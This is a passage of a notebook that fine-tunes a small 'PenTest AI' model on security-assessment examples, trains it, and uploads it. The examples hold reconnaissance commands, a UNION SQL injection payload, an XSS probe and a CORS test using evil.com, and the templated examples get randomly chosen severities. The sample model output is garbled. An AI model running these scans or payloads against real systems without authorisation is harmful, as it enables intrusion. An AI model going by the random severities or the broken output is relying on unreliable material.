Never trust user input for file paths. The rule: user input should only ever be compared against a whitelist or sanitized by a proven library function — never concatenated directly into filesystem operations."""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 9: Tool selection (pentest ask planning)
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Given this user query for pentest ask, select the appropriate tools and explain the plan.",
        "input": "Query: 'Check if this API has any authentication issues or exposed endpoints'\nTarget: https://api.example.com",
        "output": """## PenTest AI — Scan Plan

**Query analysis:** API security focus — authentication and endpoint exposure. This maps to OWASP A01 (Broken Access Control) and A02 (Authentication Failures).

### Selected Tools (7)

| Tool | Purpose | Expected findings |
|------|---------|-------------------|
| `nmap` | Port scan — find all open ports and services | Unexpected open ports, API versions |
| `ffuf` | Endpoint fuzzing — discover hidden API routes | /admin, /debug, /internal, /v1, /v2 endpoints |
| `nikto` | Web server scan | Auth bypass URLs, dangerous HTTP methods |
| `arjun` | Hidden parameter discovery | Parameters that bypass auth when added |
| `corscanner` | CORS misconfiguration | Wildcard or null origin acceptance |
| `sslyze` | TLS audit | Weak ciphers, expired certs on API |
| `custom_header_check` | Security header analysis | Missing auth headers, debug headers exposed |

### Execution Plan

**Phase 1 — Reconnaissance** (2 min)
`````bash
nmap -p 80,443,8080,8443,3000,5000,8000 api.example.com
`````
Find all listening ports. APIs often run on non-standard ports.

**Phase 2 — Endpoint Discovery** (5-8 min)
`````bash
ffuf -u https://api.example.com/FUZZ \
     -w /wordlists/api-endpoints.txt \
     -mc 200,201,204,301,302,401,403
`````
Note: 401/403 responses are interesting — they confirm the endpoint exists even if auth-protected.

**Phase 3 — Authentication Testing** (3 min)
- Test each discovered endpoint without Authorization header
- Test with `Authorization: Bearer null` / `Bearer undefined` / `Bearer admin`
- Test HTTP methods: OPTIONS to discover allowed methods, then DELETE/PUT without auth
- Check for JWT in responses — if present, decode and check algorithm/expiry

**Phase 4 — API-Specific Checks**
- `arjun` to find hidden parameters (especially `admin=true`, `debug=1`, `role=admin`)
- CORS: send `Origin: https://evil.com` — check if reflected in response
- Rate limiting: send 100 requests/second to `/login` endpoint

### What I'm NOT running
- `sqlmap` — database injection less relevant for API-first query
- `dalfox` — XSS less relevant for API (no HTML rendering)
- `subfinder` — subdomain enum not requested

### Expected High-Value Findings for APIs
1. `/api/v1/admin` or `/api/internal` without auth
2. JWT with `alg: none` attack surface
3. CORS wildcard allowing cross-origin reads
4. Missing rate limiting on auth endpoints
5. HTTP methods (DELETE, PUT) enabled without auth"""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 10: Scan diff analysis
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Analyze this scan diff and provide an assessment of the security posture change.",
        "input": """Previous scan: 2024-04-14
Current scan: 2024-04-21

NEW findings (3):
- CRITICAL: SQL injection in /api/v2/search (new endpoint deployed)
- HIGH: Exposed /api/v2/debug endpoint returning stack traces
- MEDIUM: New dependency lodash 4.17.4 with prototype pollution CVE

FIXED findings (4):
- CRITICAL: /backup.sql no longer accessible
- HIGH: Admin panel now requires authentication
- HIGH: MySQL port 3306 now firewalled
- MEDIUM: TLS 1.0 disabled

REGRESSED (1):
- LOW → HIGH: CORS now accepts null origin (regression in new deploy)""",
        "output": """## Security Posture Analysis — Weekly Diff
### 2024-04-14 → 2024-04-21

---

### Overall Verdict: ⚠️ MIXED — Progress undermined by new deployment

The team successfully closed 4 significant vulnerabilities from last week, which is excellent work. However, the new API v2 deployment introduced 3 new vulnerabilities including a critical SQL injection, and a CORS regression suggests the new code wasn't security-tested before deployment.

---

### What Went Right ✅

**Critical items closed (exceptional progress):**
1. `/backup.sql` removed — this was your highest-risk item (data exposure). Good.
2. Admin panel now authenticated — access control gap closed.
3. MySQL firewalled — infrastructure hardening done correctly.
4. TLS 1.0 disabled — compliance improvement (PCI DSS).

Closing 2 critical and 2 high findings in one week is above average for remediation velocity.

---

### What Went Wrong ⚠️

**New deployment introduced regressions:**

The `/api/v2/` deployment was not security-tested before release. Evidence:
- SQL injection in a brand-new endpoint = no SAST/DAST in the deploy pipeline
- Debug endpoint in production = development artifact shipped to prod
- lodash 4.17.4 is from 2018 — SCA (Software Composition Analysis) would have caught this

**CORS null origin (LOW → HIGH) is particularly concerning** — this is a regression, meaning something that was previously secure is now broken. This often indicates:
- Security config not included in deployment template
- New service deployed with default/development CORS settings

---

### Immediate Actions Required

1. **Today**: Take `/api/v2/debug` offline — stack traces expose internal paths and library versions to attackers

2. **Today**: Fix CORS regression:
`````python
ALLOWED_ORIGINS = [\"https://yourfrontend.com\", \"https://app.yourfrontend.com\"]
# Never allow 'null' origin — it comes from sandboxed iframes/local files
`````

3. **This week**: Fix SQL injection in `/api/v2/search` — same parameterized query fix as before

4. **Process fix**: Add security gates to your deployment pipeline:
`````yaml
# Add to CI/CD:
- run: semgrep --config=p/owasp-top-ten .    # SAST
- run: pip-audit                               # SCA (Python deps)
- run: pentest scan --target $STAGING_URL --mode quick --consent --fail-on-new-critical
`````

---

### Trend
| Week | Critical | High | Medium | Low | Total |
|------|----------|------|--------|-----|-------|
| Apr 14 | 3 | 4 | 2 | 1 | 10 |
| Apr 21 | 1 | 3 | 3 | 0 | 7 |
| Change | -2 | -1 | +1 | -1 | -3 |

Trajectory is positive if deployment security is addressed. At this remediation rate, you should reach a clean scan in 2-3 weeks."""
    },

]

print(f"Dataset loaded: {len(raw_dataset)} training examples")
print("\nCategories:")
categories = [
    "Nmap analysis (2)",
    "SQL injection (2)",
    "XSS findings (1)",
    "SSL/TLS (1)",
    "Full report generation (1)",
    "CVSS scoring (1)",
    "OWASP Top 10 (1)",
    "Remediation code (1)",
    "Tool selection / planning (1)",
    "Scan diff analysis (1)",
]
for c in categories:
    print(f"  - {c}")

Dataset loaded: 12 training examples

Categories:
  - Nmap analysis (2)
  - SQL injection (2)
  - XSS findings (1)
  - SSL/TLS (1)
  - Full report generation (1)
  - CVSS scoring (1)
  - OWASP Top 10 (1)
  - Remediation code (1)
  - Tool selection / planning (1)
  - Scan diff analysis (1)


In [ ]:
import random
import json

# ---------- CONFIG ----------
NUM_NEW_EXAMPLES = 200

services = [
    ("OpenSSH", "7.4", "CVE-2018-15473"),
    ("Apache", "2.4.49", "CVE-2021-41773"),
    ("nginx", "1.18.0", "CVE-2021-23017"),
    ("MySQL", "5.6", "CVE-2016-6662"),
    ("Tomcat", "8.5", "CVE-2020-1938"),
]

ports = [22, 80, 443, 3306, 8080, 8443]
domains = ["example.com", "testapp.com", "secureapi.io", "demo.local"]

vulns = [
    "SQL Injection",
    "XSS",
    "Path Traversal",
    "Open Redirect",
    "IDOR",
]

severities = ["CRITICAL", "HIGH", "MEDIUM"]

# ---------- GENERATORS ----------
def generate_nmap_example():
    ip = f"192.168.1.{random.randint(10,200)}"
    service = random.choice(services)
    port = random.choice(ports)
    instruction = "Analyze this nmap scan output and identify security risks."
    input_text = f"PORT   STATE SERVICE VERSION\n{port}/tcp open  {service[0].lower()} {service[0]} {service[1]}"
    output = f"## Nmap Analysis — {ip}\n\n### {random.choice(severities)} Finding\n\n**[{random.choice(severities)}] {service[0]} {service[1]} (Port {port})**\n- Vulnerable to {service[2]}\n- Outdated version detected\n- Risk: Remote exploitation possible\n\n### Recommendation\n- Upgrade {service[0]} to latest version\n- Restrict external access using firewall\n"
    return {"instruction": instruction, "input": input_text, "output": output}

def generate_sqli_example():
    instruction = "Analyze this SQL injection finding and explain impact."
    param = random.choice(["id", "user", "search"])
    input_text = f"Parameter: {param}\nType: UNION-based SQL injection\nPayload: {param}=1 UNION SELECT username,password FROM users"
    output = f"## SQL Injection — {random.choice(severities)}\n\n### Impact\n- Full database exposure\n- Sensitive data leakage\n- Possible authentication bypass\n\n### Fix\n- Use parameterized queries\n- Validate input strictly\n"
    return {"instruction": instruction, "input": input_text, "output": output}

def generate_xss_example():
    instruction = "Analyze this XSS payload and generate findings."
    payload = "<script>alert(1)</script>"
    input_text = f"Payload: {payload}\nLocation: /search?q="
    output = f"## XSS Finding — HIGH\n\n### Impact\n- Session hijacking\n- Cookie theft\n- Malicious script execution\n\n### Fix\n- Escape output\n- Implement CSP headers\n"
    return {"instruction": instruction, "input": input_text, "output": output}

def generate_api_example():
    instruction = "Identify security issues in this API response."
    endpoint = random.choice(["/api/user", "/api/admin", "/api/data"])
    input_text = f"GET {endpoint} returns 200 without authentication"
    output = f"## API Security Issue — CRITICAL\n\n### Issue\n- Endpoint accessible without authentication\n\n### Impact\n- Data exposure\n- Unauthorized access\n\n### Fix\n- Implement authentication checks\n- Use role-based access control\n"
    return {"instruction": instruction, "input": input_text, "output": output}

# ---------- MAIN GENERATOR ----------
generators = [generate_nmap_example, generate_sqli_example, generate_xss_example, generate_api_example]
new_data = []
for _ in range(NUM_NEW_EXAMPLES):
    gen_func = random.choice(generators)
    new_data.append(gen_func())

with open("generated_dataset.json", "w") as f:
    json.dump(new_data, f, indent=2)

print(f"Generated {len(new_data)} new examples ✅")

Generated 200 new examples ✅


In [ ]:
from datasets import Dataset

def prepare_examples(examples):
    texts = []
    for ex in examples:
        text = format_prompt(
            ex["instruction"],
            ex.get("input", ""),
            ex["output"]
        )
        texts.append({"text": text})
    return texts

# Combine the original 12 with the 100 newly generated variations
combined_dataset = raw_dataset + new_data

formatted = prepare_examples(combined_dataset)
dataset = Dataset.from_list(formatted)

print(f"Training examples: {len(dataset)}")
print(f"\nSample (first 500 chars):\n{dataset[0]['text'][:500]}")

Training examples: 212

Sample (first 500 chars):
<start_of_turn>user
You are PenTest AI, an expert cybersecurity consultant. Your goal is to provide comprehensive vulnerability assessments.

For every report, you MUST include:
1. EXECUTIVE SUMMARY (Non-Technical): A high-level overview of the business risk.
2. TECHNICAL ANALYSIS: A detailed breakdown of the technical root cause.
3. VULNERABILITY DETAILS: Specific CVE IDs and calculated CVSS 3.1 scores.
4. REMEDIATION STRATEGY: Step-by-step instructions and code snippets to fix the issue.

Styl


In [ ]:
from trl import SFTTrainer
from transformers import TrainingArguments
from unsloth import is_bfloat16_supported
import torch

# Clear memory
torch.cuda.empty_cache()

# Step 4: Create validation split
# We'll use 20 examples for validation as requested
full_dataset = dataset.shuffle(seed=42)
eval_dataset = full_dataset.select(range(20))
train_dataset = full_dataset.select(range(20, len(full_dataset)))

OUTPUT_DIR = "/content/drive/MyDrive/pentest-ai-model/checkpoints"

trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    train_dataset=train_dataset,
    eval_dataset=eval_dataset,
    dataset_text_field="text",
    max_seq_length=MAX_SEQ_LENGTH,
    dataset_num_proc=2,
    args=TrainingArguments(
        per_device_train_batch_size=1,
        gradient_accumulation_steps=8,
        warmup_steps=5,
        num_train_epochs=5,             # Step 2: Increased epochs
        learning_rate=1e-4,             # Step 3: Lowered learning rate
        fp16=not is_bfloat16_supported(),
        bf16=is_bfloat16_supported(),
        logging_steps=1,
        optim="adamw_8bit",
        weight_decay=0.01,
        lr_scheduler_type="linear",
        seed=42,
        output_dir=OUTPUT_DIR,
        save_steps=50,
        save_total_limit=3,
        report_to="none",
        eval_strategy="steps",        # Fixed: Changed from evaluation_strategy
        eval_steps=10,
        gradient_checkpointing=True,
    ),
)

stats = trainer.train()
print(f"\nTraining complete!")

Unsloth: Tokenizing ["text"] (num_proc=6):   0%|          | 0/192 [00:00<?, ? examples/s]

Unsloth: Tokenizing ["text"] (num_proc=6):   0%|          | 0/20 [00:00<?, ? examples/s]

The tokenizer has new PAD/BOS/EOS tokens that differ from the model config and generation config. The model config and generation config were aligned accordingly, being updated with the tokenizer's values. Updated tokens: {'bos_token_id': None}.
==((====))==  Unsloth - 2x faster free finetuning | Num GPUs used = 1
   \\   /|    Num examples = 192 | Num Epochs = 5 | Total steps = 120
O^O/ \_/ \    Batch size per device = 1 | Gradient accumulation steps = 8
\        /    Data Parallel GPUs = 1 | Total batch size (1 x 8 x 1) = 8
 "-____-"     Trainable parameters = 18,464,768 of 1,562,179,072 (1.18% trained)
`use_return_dict` is deprecated! Use `return_dict` instead!


Unsloth: Will smartly offload gradients to save VRAM!


Step,Training Loss,Validation Loss
10,2.129298,1.919046
20,0.892846,0.832386
30,0.381953,0.405587
40,1.493511,0.209392
50,0.876570,0.147125
60,0.552572,0.124196
70,0.041034,0.115910
80,0.686675,0.110868
90,0.053067,0.106974
100,0.036362,0.106556


/usr/local/lib/python3.12/dist-packages/transformers/modeling_attn_mask_utils.py:71: FutureWarning: The attention mask API under `transformers.modeling_attn_mask_utils` (`AttentionMaskConverter`) is deprecated and will be removed in Transformers v5.10. Please use the new API in `transformers.masking_utils`.
  warnings.warn(DEPRECATION_MESSAGE, FutureWarning)
/usr/local/lib/python3.12/dist-packages/transformers/modeling_attn_mask_utils.py:281: FutureWarning: The attention mask API under `transformers.modeling_attn_mask_utils` (`AttentionMaskConverter`) is deprecated and will be removed in Transformers v5.10. Please use the new API in `transformers.masking_utils`.
  warnings.warn(DEPRECATION_MESSAGE, FutureWarning)
/usr/local/lib/python3.12/dist-packages/transformers/modeling_attn_mask_utils.py:71: FutureWarning: The attention mask API under `transformers.modeling_attn_mask_utils` (`AttentionMaskConverter`) is deprecated and will be removed in Transformers v5.10. Please use the new API i


Training complete!


In [ ]:
from unsloth import FastLanguageModel
from unsloth.chat_templates import get_chat_template

# Ensure model is in inference mode
FastLanguageModel.for_inference(model)

instruction = "Perform a deep security analysis of this scan output. Provide non-technical and technical summaries, CVEs, CVSS scores, and fix instructions."
input_data = """PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.3p1
80/tcp open  http    Apache httpd 2.2.15
3306/tcp open mysql  MySQL 5.1.73"""

# Using the format_prompt explicitly with empty output string to be safe
formatted_prompt = format_prompt(instruction, input_data, output="")

inputs = tokenizer(formatted_prompt, return_tensors="pt").to("cuda")

outputs = model.generate(
    **inputs,
    max_new_tokens=1500,
    temperature=0.5,
    do_sample=True,
)

response = tokenizer.decode(outputs[0][inputs.input_ids.shape[1]:], skip_special_tokens=True)
print("=" * 60)
print("ADVANCED PEN-TEST REPORT:")
print("=" * 60)
print(response)

Both `max_new_tokens` (=1500) and `max_length`(=32768) seem to have been set. `max_new_tokens` will take precedence. Please refer to the documentation for more information. (https://huggingface.co/docs/transformers/main/en/main_classes/text_generation)
/usr/local/lib/python3.12/dist-packages/transformers/modeling_attn_mask_utils.py:71: FutureWarning: The attention mask API under `transformers.modeling_attn_mask_utils` (`AttentionMaskConverter`) is deprecated and will be removed in Transformers v5.10. Please use the new API in `transformers.masking_utils`.
  warnings.warn(DEPRECATION_MESSAGE, FutureWarning)
/usr/local/lib/python3.12/dist-packages/transformers/modeling_attn_mask_utils.py:281: FutureWarning: The attention mask API under `transformers.modeling_attn_mask_utils` (`AttentionMaskConverter`) is deprecated and will be removed in Transformers v5.10. Please use the new API in `transformers.masking_utils`.
  warnings.warn(DEPRECATION_MESSAGE, FutureWarning)
/usr/local/lib/python3.1

ADVANCED PEN-TEST REPORT:
## Security Analysis — Non-Technical

### Impact
- Full control over SSH accessible from port 22
- Access to Apache HTTP server on port 80
- Access to MySQL database on port 3306

### Recommendation
- Restrict external access using firewall rules
- Implement secure authentication methods for SSH
- Configure Apache to use HTTPS
- Restrict MySQL access based on role or privilege<end_of_turn>
<start_of_turn>model
## Security Analysis — Technical

### Issue
- Vulnerable services detected
- Outdated versions found
- Possible remote exploitation

### Fix
- Upgrade all vulnerable services
- Apply security patches
- Restrict access as needed
- Implement role-based access controls<end_of_turn>

### Code Snippet
```
# Upgrade SSH service to latest version
sudo apt-get update && sudo apt-get install openssh-server -y

# Update Apache configuration to use HTTPS
sudo sed -i 's/Listen 80/Listen 443 ssl/#/' /etc/apache2/sites-available/default.conf

# Restrict MySQL access b

In [ ]:
SAVE_PATH = "/content/drive/MyDrive/pentest-ai-model/lora-adapters"

model.save_pretrained(SAVE_PATH)
tokenizer.save_pretrained(SAVE_PATH)

print(f"LoRA adapters saved to: {SAVE_PATH}")
print("Size: ~50-100MB (only the adapter weights, not full model)")

Unsloth: Restored added_tokens_decoder metadata in /content/drive/MyDrive/pentest-ai-model/lora-adapters/tokenizer_config.json.


LoRA adapters saved to: /content/drive/MyDrive/pentest-ai-model/lora-adapters
Size: ~50-100MB (only the adapter weights, not full model)


In [ ]:
# The previous run failed due to disk space limits.
# Exporting GGUF locally requires ~15-20GB of temporary space.
# If you have a Hugging Face token, pushing to the hub is the best workaround:

# model.push_to_hub_gguf(
#     "your_username/pentest-ai-gemma-3-gguf",
#     tokenizer,
#     quantization_method = "q4_k_m",
#     token = "YOUR_HF_TOKEN",
# )

print("ERROR DIAGNOSIS: The environment ran out of disk space during the GGUF merge.")
print("To fix this, either:")
print("1. Clear space in /content/ or Google Drive (at least 20GB free recommended).")
print("2. Use model.push_to_hub_gguf(...) to upload directly to Hugging Face.")

ERROR DIAGNOSIS: The environment ran out of disk space during the GGUF merge.
To fix this, either:
1. Clear space in /content/ or Google Drive (at least 20GB free recommended).
2. Use model.push_to_hub_gguf(...) to upload directly to Hugging Face.


In [ ]:
from huggingface_hub import login

login("hf_YOUR_TOKEN_HERE")

In [ ]:
model.push_to_hub_gguf(
    "Mohit2EZ/pentest-ai",
    tokenizer,
    quantization_method="q4_k_m",
)

Unsloth: Converting model to GGUF format...
Unsloth: Merging model weights to 16-bit format...


config.json:   0%|          | 0.00/766 [00:00<?, ?B/s]

Unsloth: Restored added_tokens_decoder metadata in /tmp/unsloth_gguf_0tce3ars/tokenizer_config.json.


Found HuggingFace hub cache directory: /root/.cache/huggingface/hub
Checking cache directory for required files...
Cache check failed: model.safetensors not found in local cache.
Not all required files found in cache. Will proceed with downloading.
Checking cache directory for required files...
Cache check failed: tokenizer.model not found in local cache.
Not all required files found in cache. Will proceed with downloading.


Unsloth: Preparing safetensor model files:   0%|          | 0/1 [00:00<?, ?it/s]

...

Processing Files (0 / 0)      : |          |  0.00B /  0.00B            

New Data Upload               : |          |  0.00B /  0.00B            

  ...1.5b-instruct.Q4_K_M.gguf:  11%|#         |  104MB /  986MB            

Uploading config.json...
Uploading local model Modelfile...
Unsloth: Successfully uploaded GGUF to https://huggingface.co/Mohit2EZ/pentest-ai
Unsloth: Cleaning up temporary files...


'Mohit2EZ/pentest-ai'